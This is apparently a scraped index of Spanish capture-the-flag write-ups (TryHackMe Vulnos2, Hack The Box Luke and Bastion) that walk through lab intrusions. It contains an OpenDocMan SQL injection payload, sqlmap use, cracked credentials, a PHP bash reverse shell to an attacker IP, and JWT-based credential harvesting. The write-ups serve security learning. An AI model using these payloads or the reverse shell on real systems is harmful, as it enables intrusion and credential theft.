hay contenido de esta pagina al analizar el codigo fuente de la pagina, observamos que existe texto oculto por razones de \u0026ldquo;seguridad\u0026rdquo;. En el texto nos indica que para visitar la documentacion de la pagina visitemos /jabcd0cs/ e iniciemos sesion con guest/guest.\nHTTP - /jabcd0cs/ Visitamos la pagina y nos muestra un panel para iniciar sesion.\nAl iniciar sesion en la plataforma nos muestra un panel de control.\nVemos que la plataforma es OpenDocMan v1.2.7.\nOpenDocMan 1.2.7 - Multiple Vulnerabilities Al investgar un poco mas acerca de esta plataforma encontramos que en especifico esta version de OpenDocMan tiene dos vulnerabilidades. La primera es una vulnerabilidad de Inyeccion de SQL y la segunda Improper Access Control.\nSQL Injection - OpenDocMan 1.2.7 Comprobamos si la vulnerabilidad de SQLi esta presente en la plataforma con la url y parametros para ver el usuario (user()).\nPayload:\najax_udf.php?q=1\u0026amp;add_value=odm_user%20UNION%20SELECT%201,user%28%29,3,4,5,6,7,8,9 Vemos que la vulnerabilidad esta presente ya que nos muestra el usuario. Para obtener los datos de la base de datos, utilizamos burpsuite para interceptar el trafico, guardamos el trafico del payload de SQLi de esta plataforma en un archivo response.req y utilizamos sqlmap con este archivo.\nresponse.req\nSQLMAP Comando:\n1 sqlmap -r response.req --dbs Database: jabcd0cs\r[15 tables]\r+-------------------+\r| odm_access_log |\r| odm_admin |\r| odm_category |\r| odm_data |\r| odm_department |\r| odm_dept_perms |\r| odm_dept_reviewer |\r| odm_filetypes |\r| odm_log |\r| odm_odmsys |\r| odm_rights |\r| odm_settings |\r| odm_udf |\r| odm_user |\r| odm_user_perms |\r+-------------------+\rDatabase: jabcd0cs\rTable: odm_user\r[2 entries]\r+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+\r| id | phone | Email | username | password | last_name | first_name | department | pw_reset_code |\r+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+\r| 1 | 5555551212 | webmin@example.com | webmin | b78aae356709f8c31118ea613980954b | min | web | 2 | \u0026lt;blank\u0026gt; |\r| 2 | 555 5555555 | guest@example.com | guest | 084e0343a0486ff05530df6c705c8bb4 | guest | guest | 2 | NULL |\r+----+-------------+--------------------+----------+----------------------------------+-----------+------------+------------+---------------+ Utilizamos md5online.org para obtener la contraseña del hash md5 del usuario webadmin.\nCredenciales:\nwebmin:webmin1980\rguest:guest SHELL - PHP Ya que tenemos las credenciales de administrador regresamos a la pagina principal /jabc/ y visitamos el panel de inicio de sesion y utilizamos las credenciales (webmin:webmin1980), ya que tenemos control de las paginas habilitamos el modulo de PHP (PHP Filter), luego de esto agregamos codigo php con nuestra shell inversa a la pagina de \u0026lsquo;Documentation\u0026rsquo;.\nPHP Modulo:\nCodigo PHP:\n1 2 3 \u0026lt;?php exec(\u0026#34;/bin/bash -c \u0026#39;bash -i \u0026gt;\u0026amp; /dev/tcp/10.8.1.72/1337 0\u0026gt;\u0026amp;1\u0026#39;\u0026#34;); ?\u0026gt; Netcat:\nPonemos a la escucha nuestra maquina con netcat y el puerto 1337.\nPRIVILEGE ESCALATION Verificamos la version del kernel de la maquina y verificamos si existe un exploit para esa version con searchsploit.\nVersion de Kernel:\nSearchsploit:\nDescargamos el exploit, lo compilamos y lo descargamos en la maquina, le damos permisos al archivo de ejecucion, ejecutamos el archivo y obtenemos permisos root.\nObtenemos nuestra flag en /root/flag.txt.\nExploitDB:\nOpenDocMan 1.2.7 - Multiple Vulnerabilities\nLinux Kernel 3.13.0 \u0026lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - \u0026lsquo;overlayfs\u0026rsquo; Local Privilege Escalation\n","description":"Vulnos2 es una maquina de TryHackMe, encontramos multiples vulnerabilidades en OpenDocMan las cuales explotamos para obtener credenciales y acceer al panel de Drupal, que luego nos permitio ejecutar una shell inversa. Ejecutamos un exploit que afecta al Kernel de Linux para escalar privilegios.","id":187,"section":"posts","tags":["jabc-docs","sqli","sqlmap","kernel"],"title":"TryHackMe - Vulnos2","uri":"https://sckull.github.io/posts/vulnos2/"},{"content":"\rEn Luke descubrimos credenciales las cuales permitieron autenticarnos en el puerto 3000 donde obtuvimos nuevas credenciales para el panel administrativo que posteriormente nos dio acceso por Ajenti donde ejecutamos una terminal con acceso privilegiado.\nInformacion de la Maquina Nombre Luke OS FreeBSD Puntos 30 Dificultad Media IP 10.10.10.137 Maker H4d3s\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[8.5, 3.7, 3.1, 6.9, 6.3],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[0, 0, 0, 0, 0],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos tcp/udp y su servicio.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 masscan -p1-65535,U:1-65535 10.10.10.137 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-28 21:04:45 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 8000/tcp on 10.10.10.137 Discovered open port 3000/tcp on 10.10.10.137 Discovered open port 80/tcp on 10.10.10.137 Discovered open port 21/tcp on 10.10.10.137 Discovered open port 22/tcp on 10.10.10.137 nmap -sV -p8000,3000,80,21,22 10.10.10.137 -o nmap.scan Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-28 16:28 CDT Nmap scan report for 10.10.10.137 Host is up (1.2s latency). PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3+ (ext.1) 22/tcp open ssh? 80/tcp open http Apache httpd 2.4.38 ((FreeBSD) PHP/7.3.3) 3000/tcp open http Node.js Express framework 8000/tcp open http-alt 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port8000-TCP:V=7.70%I=7%D=5/28%Time=5CEDA82A%P=x86_64-pc-linux-gnu%r(He SF:lp,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nCo SF:ntent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SSLSessionReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Ba SF:d\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)% SF:r(LDAPSearchReq,42,\u0026#34;HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nConnection:\\x SF:20close\\r\\nContent-length:\\x200\\r\\n\\r\\n\u0026#34;)%r(SIPOptions,42,\u0026#34;HTTP/1\\.1\\x2 SF:0400\\x20Bad\\x20Request\\r\\nConnection:\\x20close\\r\\nContent-length:\\x200\\ SF:r\\n\\r\\n\u0026#34;); Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 190.94 seconds FTP Ingresamos al servicio de FTP con las credenciales tipicas de anonymous y encontramos un archivo, for_Chihiro.txt.\nfor_Chihiro.txt\n1 2 3 4 5 6 7 Dear Chihiro !! As you told me that you wanted to learn Web Development and Frontend, I can give you a little push by showing the sources of the actual website I\u0026#39;ve created . Normally you should know where to look but hurry up because I will delete them soon because of our security policies ! Derry HTTP - Puerto 80 GOBUSTER - Puerto 80 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137/ -np -t 15 -x php,html,txt ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : txt,php,html [+] Timeout : 10s ===================================================== 2019/05/28 17:39:33 Starting gobuster ===================================================== /cgi-bin/.html (Status: 403) /config.php (Status: 200) /css (Status: 301) /index.html (Status: 200) /index.html (Status: 200) /js (Status: 301) /LICENSE (Status: 200) /login.php (Status: 200) /management (Status: 301) /member (Status: 301) /vendor (Status: 301) ===================================================== 2019/05/28 17:46:34 Finished ===================================================== /config.php 1 2 3 4 5 $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error); /management /login.php PUERTO 8000 En el puerto 8000 encontramos un panel de logeo para la plataforma Ajenti.\nEn este punto utilizamos la contraseña y usuario que encontramos en config.php en los diferentes paneles de logeo pero no tuvimos acceso en ninguno de ellos con las credenciales.\nGOBUSTER - Puerto 3000 Solo encontramos directorios para solicitudes de nodejs o json.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.137:3000/ -np -t 15 -x php,html,txt,js ===================================================== Gobuster v2.0.1 OJ Reeves (@TheColonial) ===================================================== [+] Mode : dir [+] Url/Domain : http://10.10.10.137:3000/ [+] Threads : 15 [+] Wordlist : /usr/share/wordlists/dirb/common.txt [+] Status codes : 200,204,301,302,307,403 [+] Extensions : html,txt,js,php [+] Timeout : 10s ===================================================== 2019/05/28 17:58:23 Starting gobuster ===================================================== /login (Status: 200) /Login (Status: 200) /users (Status: 200) ===================================================== 2019/05/28 18:05:20 Finished ===================================================== API REQUESTS Realizamos un escaneo de directorios con DIRBUSTER y obtuvimos dos \u0026ldquo;directorios\u0026rdquo; más en /users.\n1 2 3 4 /users /users/Admin /users/admin /users/ADMiN Al visitar /login y /Login nos muestra el siguiente mensaje:\n1 \u0026#34;please auth\u0026#34; Al visitar /users:\n1 {\u0026#34;success\u0026#34;:false,\u0026#34;message\u0026#34;:\u0026#34;Auth token is not supplied\u0026#34;} Realizamos una busqueda de los mensajes que nos mostraba la pagina web al visitar cada uno de los \u0026ldquo;directorios\u0026rdquo;, encontramos una pagina que habal sobre tokens.\nINFO: Token Authentication - Nodejs\nPara obtener nuestro token utilizamos el siguiente request con curl, añadimos la contraseña que encontramos en la pagina config.php, usamos el usuario admin para el request.\n1 curl --header \u0026#34;Content-Type: application/json\u0026#34; --request POST --data \u0026#39;{\u0026#34;password\u0026#34;:\u0026#34;Zk6heYCyv6ZE9Xcg\u0026#34;, \u0026#34;username\u0026#34;:\u0026#34;admin\u0026#34;}\u0026#39; http://10.10.10.137:3000/login El resultado del request, obtuvimos nuestro token de autenticacion.\n1 {\u0026#34;success\u0026#34;:true,\u0026#34;message\u0026#34;:\u0026#34;Authentication successful!\u0026#34;,\u0026#34;token\u0026#34;:\u0026#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#34;} CREDENCIALES Utilizamos el token de autenticacion para poder acceder a los usuarios dentro del \u0026ldquo;directorio\u0026rdquo; /users.\n1 2 3 curl -X GET \\ -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; \\ http://10.10.10.137:3000/users El resultado del request, obtuvimos algunos nombres con su respectivo ID, Nombre y Rol que tiene cada uno de ellos.\n1 [{\u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34;},{\u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34;}] Users:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 [ { \u0026#34;ID\u0026#34;:\u0026#34;1\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Superuser\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;2\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Web Admin\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;3\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Beta Tester\u0026#34; }, { \u0026#34;ID\u0026#34;:\u0026#34;4\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;, \u0026#34;Role\u0026#34;:\u0026#34;Supporter\u0026#34; } ] Visitamos de igual forma la siguiente ruta con el token /users/Admin y obtuvimos la contraseña del usuario admin.\nRequest:\n1 curl -X GET -H \u0026#39;Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwiaWF0IjoxNTU5MDg5OTQ4LCJleHAiOjE1NTkxNzYzNDh9.vNBalNKwq3ML0MOlw-3OYGFlIUwuyjOE6kCLFB5paW4\u0026#39; http://10.10.10.137:3000/users/admin/ Respuesta:\n1 {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;} Utilizamos el mismo request cambiamos /admin/ por la lista de usuarios que encontramos para obtener las contraseñas de los mismos.\nUser-Pass:\n1 2 3 4 {\u0026#34;name\u0026#34;:\u0026#34;Admin\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;WX5b7)\u0026gt;/rp$U)FW\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Derry\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;rZ86wwLvx7jUxtch\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Yuri\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;bet@tester87\u0026#34;} {\u0026#34;name\u0026#34;:\u0026#34;Dory\u0026#34;,\u0026#34;password\u0026#34;:\u0026#34;5y:!xa=ybfe)/QD\u0026#34;} PUERTO 80 - AUTH Utilizamos las Credenciales en los distintos paneles que encontramos, en el caso de las credenciales de Derry funcionaron en el panel de /management en el puerto 80 y nos muestra:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 { \u0026#34;users\u0026#34;: { \u0026#34;root\u0026#34;: { \u0026#34;configs\u0026#34;: { \u0026#34;ajenti.plugins.notepad.notepad.Notepad\u0026#34;: \u0026#34;{\\\u0026#34;bookmarks\\\u0026#34;: [], \\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.terminal.main.Terminals\u0026#34;: \u0026#34;{\\\u0026#34;shell\\\u0026#34;: \\\u0026#34;sh -c $SHELL || sh\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.ipmap.ElementsIPMapper\u0026#34;: \u0026#34;{\\\u0026#34;users\\\u0026#34;: {}}\u0026#34;, \u0026#34;ajenti.plugins.munin.client.MuninClient\u0026#34;: \u0026#34;{\\\u0026#34;username\\\u0026#34;: \\\u0026#34;username\\\u0026#34;, \\\u0026#34;prefix\\\u0026#34;: \\\u0026#34;http://localhost:8080/munin\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;123\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.dashboard.dash.Dash\u0026#34;: \u0026#34;{\\\u0026#34;widgets\\\u0026#34;: [{\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.MemoryWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.memory.SwapWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;1\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.dashboard.welcome.WelcomeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 0, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.uptime.UptimeWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 1, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.power.power.PowerWidget\\\u0026#34;}, {\\\u0026#34;index\\\u0026#34;: 2, \\\u0026#34;config\\\u0026#34;: null, \\\u0026#34;container\\\u0026#34;: \\\u0026#34;0\\\u0026#34;, \\\u0026#34;class\\\u0026#34;: \\\u0026#34;ajenti.plugins.sensors.cpu.CPUWidget\\\u0026#34;}]}\u0026#34;, \u0026#34;ajenti.plugins.elements.shaper.main.Shaper\u0026#34;: \u0026#34;{\\\u0026#34;rules\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.ajenti_org.main.AjentiOrgReporter\u0026#34;: \u0026#34;{\\\u0026#34;key\\\u0026#34;: null}\u0026#34;, \u0026#34;ajenti.plugins.logs.main.Logs\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/var/log\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.mysql.api.MySQLDB\u0026#34;: \u0026#34;{\\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;root\\\u0026#34;, \\\u0026#34;hostname\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.fm.fm.FileManager\u0026#34;: \u0026#34;{\\\u0026#34;root\\\u0026#34;: \\\u0026#34;/\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.tasks.manager.TaskManager\u0026#34;: \u0026#34;{\\\u0026#34;task_definitions\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.users.UserManager\u0026#34;: \u0026#34;{\\\u0026#34;sync-provider\\\u0026#34;: \\\u0026#34;\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.usersync.adsync.ActiveDirectorySyncProvider\u0026#34;: \u0026#34;{\\\u0026#34;domain\\\u0026#34;: \\\u0026#34;DOMAIN\\\u0026#34;, \\\u0026#34;password\\\u0026#34;: \\\u0026#34;\\\u0026#34;, \\\u0026#34;user\\\u0026#34;: \\\u0026#34;Administrator\\\u0026#34;, \\\u0026#34;base\\\u0026#34;: \\\u0026#34;cn=Users,dc=DOMAIN\\\u0026#34;, \\\u0026#34;address\\\u0026#34;: \\\u0026#34;localhost\\\u0026#34;}\u0026#34;, \u0026#34;ajenti.plugins.elements.usermgr.ElementsUserManager\u0026#34;: \u0026#34;{\\\u0026#34;groups\\\u0026#34;: []}\u0026#34;, \u0026#34;ajenti.plugins.elements.projects.main.ElementsProjectManager\u0026#34;: \u0026#34;{\\\u0026#34;projects\\\u0026#34;: \\\u0026#34;KGxwMQou\\\\n\\\u0026#34;}\u0026#34; }, \u0026#34;password\u0026#34;: \u0026#34;KpMasng6S5EtTy9Z\u0026#34;, \u0026#34;permissions\u0026#34;: [] } }, \u0026#34;language\u0026#34;: \u0026#34;\u0026#34;, \u0026#34;bind\u0026#34;: { \u0026#34;host\u0026#34;: \u0026#34;0.0.0.0\u0026#34;, \u0026#34;port\u0026#34;: 8000 }, \u0026#34;enable_feedback\u0026#34;: true, \u0026#34;ssl\u0026#34;: { \u0026#34;enable\u0026#34;: false, \u0026#34;certificate_path\u0026#34;: \u0026#34;\u0026#34; }, \u0026#34;authentication\u0026#34;: true, \u0026#34;installation_id\u0026#34;: 12354 } 1 $dbHost = \u0026#39;localhost\u0026#39;; $dbUsername = \u0026#39;root\u0026#39;; $dbPassword = \u0026#39;Zk6heYCyv6ZE9Xcg\u0026#39;; $db = \u0026#34;login\u0026#34;; $conn = new mysqli($dbHost, $dbUsername, $dbPassword,$db) or die(\u0026#34;Connect failed: %s\\n\u0026#34;. $conn -\u0026gt; error); login.php Nos enfocamos en el archivo config.json el cual contiene configuracion del mismo usuario root, contraseña, y algunas otras configuraciones, una de las cuales nos muestra el host y puerto. Las credenciales:\n1 2 user: root password: KpMasng6S5EtTy9Z AJENTI Utilizamos las credenciales en el puerto 8000 y pudimos logearnos a la plataforma Ajenti.\nSHELL - USER/ROOT Utilizamos la opcion de TERMINAL que nos ofrece Ajenti y obtenemos una shell como usuario root, y las banderas user.txt/root.txt.\nSHELL ","description":"En Luke descubrimos credenciales las cuales permitieron autenticarnos en el puerto 3000 donde obtuvimos nuevas credenciales para el panel administrativo que posteriormente nos dio acceso por Ajenti donde ejecutamos una terminal con acceso privilegiado.","id":188,"section":"posts","tags":["ftp","ajenti","jwt"],"title":"Hack The Box - Luke","uri":"https://sckull.github.io/posts/luke/"},{"content":"\rBastion es una maquina con dificultad facil, tiene un Disco Duro Virtual (VHD) expuesto en recurso de SAMBA, utilizando Windows montamos el disco y obtuvimos los hashes con mimikatz seguidamente con John una contraseña lo que nos dio acceso al servicio SSH. Importando el archivo de configuracion de mRemoteNG nos permitió obtener credenciales y escalar privilegios.\nInformacion de la Maquina Nombre Bastion OS Windows Puntos 20 Dificultad Facil IP 10.10.10.134 Maker L4mpje\nMatrix\r{\r\u0026#34;type\u0026#34;:\u0026#34;radar\u0026#34;,\r\u0026#34;data\u0026#34;:{\r\u0026#34;labels\u0026#34;:[\u0026#34;Enumeration\u0026#34;,\u0026#34;Real-Life\u0026#34;,\u0026#34;CVE\u0026#34;,\u0026#34;Custom Explotation\u0026#34;,\u0026#34;CTF-Like\u0026#34;],\r\u0026#34;datasets\u0026#34;:[\r{\r\u0026#34;label\u0026#34;:\u0026#34;User Rate\u0026#34;, \u0026#34;data\u0026#34;:[7.5, 7.8, 5.7, 4.3, 2.2],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(75, 162, 189,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#4ba2bd\u0026#34;\r},\r{ \u0026#34;label\u0026#34;:\u0026#34;Maker Rate\u0026#34;,\r\u0026#34;data\u0026#34;:[8, 9, 4, 6, 1],\r\u0026#34;backgroundColor\u0026#34;:\u0026#34;rgba(154, 204, 20,0.5)\u0026#34;,\r\u0026#34;borderColor\u0026#34;:\u0026#34;#9acc14\u0026#34;\r}\r]\r},\r\u0026#34;options\u0026#34;: {\u0026#34;scale\u0026#34;: {\u0026#34;ticks\u0026#34;: {\u0026#34;backdropColor\u0026#34;:\u0026#34;rgba(0,0,0,0)\u0026#34;},\r\u0026#34;angleLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;},\r\u0026#34;gridLines\u0026#34;:{\u0026#34;color\u0026#34;:\u0026#34;rgba(255, 255, 255,0.6)\u0026#34;}\r}\r}\r} MASSCAN \u0026amp; NMAP Escaneo de puertos UDP/TCP con masscan.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 root@sckull:~/htb/bastion# masscan -p1-65535,U:1-65535 10.10.10.134 --rate=1000 -e tun0 Starting masscan 1.0.4 (http://bit.ly/14GZzcT) at 2019-05-07 17:02:20 GMT -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth Initiating SYN Stealth Scan Scanning 1 hosts [131070 ports/host] Discovered open port 22/tcp on 10.10.10.134 Discovered open port 135/tcp on 10.10.10.134 Discovered open port 5985/tcp on 10.10.10.134 Discovered open port 49664/tcp on 10.10.10.134 Discovered open port 49666/tcp on 10.10.10.134 Discovered open port 445/tcp on 10.10.10.134 Discovered open port 49668/tcp on 10.10.10.134 Discovered open port 139/tcp on 10.10.10.134 Discovered open port 49667/tcp on 10.10.10.134 Discovered open port 47001/tcp on 10.10.10.134 Discovered open port 49670/tcp on 10.10.10.134 Discovered open port 49669/tcp on 10.10.10.134 Escaneo de puertos TCP con nmap.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 root@sckull:~/htb/bastion# nmap -p49667,139,49670,445,49669,49668,135,49666,22 -sV -A -O 10.10.10.134 Starting Nmap 7.70 ( https://nmap.org ) at 2019-05-07 18:58 BST Nmap scan report for 10.10.10.134 Host is up (0.13s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH for_Windows_7.9 (protocol 2.0) | ssh-hostkey: | 2048 3a:56:ae:75:3c:78:0e:c8:56:4d:cb:1c:22:bf:45:8a (RSA) | 256 cc:2e:56:ab:19:97:d5:bb:03:fb:82:cd:63:da:68:01 (ECDSA) |_ 256 93:5f:5d:aa:ca:9f:53:e7:f2:82:e6:64:a8:a3:a0:18 (ED25519) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds 49666/tcp open msrpc Microsoft Windows RPC 49667/tcp open msrpc Microsoft Windows RPC 49668/tcp open msrpc Microsoft Windows RPC 49669/tcp open msrpc Microsoft Windows RPC 49670/tcp open msrpc Microsoft Windows RPC Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Aggressive OS guesses: Microsoft Windows Server 2016 build 10586 - 14393 (96%), Microsoft Windows Server 2016 (95%), Microsoft Windows 10 (93%), Microsoft Windows 10 1507 (93%), Microsoft Windows 10 1507 - 1607 (93%), Microso$t Windows Server 2012 (93%), Microsoft Windows Server 2012 R2 (93%), Microsoft Windows Server 2012 R2 Update 1 (93%), Microsoft Windows 7, Windows Server 2012, or Windows 8.1 Update 1 (93%), Microsoft Windows Vista SP1 - SP2, Windows Server 2008 SP2, or Windows 7 (93%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: -39m52s, deviation: 1h09m14s, median: 5s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: Bastion | NetBIOS computer name: BASTION\\x00 | Workgroup: WORKGROUP\\x00 |_ System time: 2019-05-07T20:00:16+02:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: disabled (dangerous, but default) | smb2-security-mode: | 2.02: |_ Message signing enabled but not required | smb2-time: | date: 2019-05-07 19:00:12 |_ start_date: 2019-05-07 10:50:40 TRACEROUTE (using port 135/tcp) HOP RTT ADDRESS 1 123.61 ms 10.10.14.1 2 123.96 ms 10.10.10.134 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 82.98 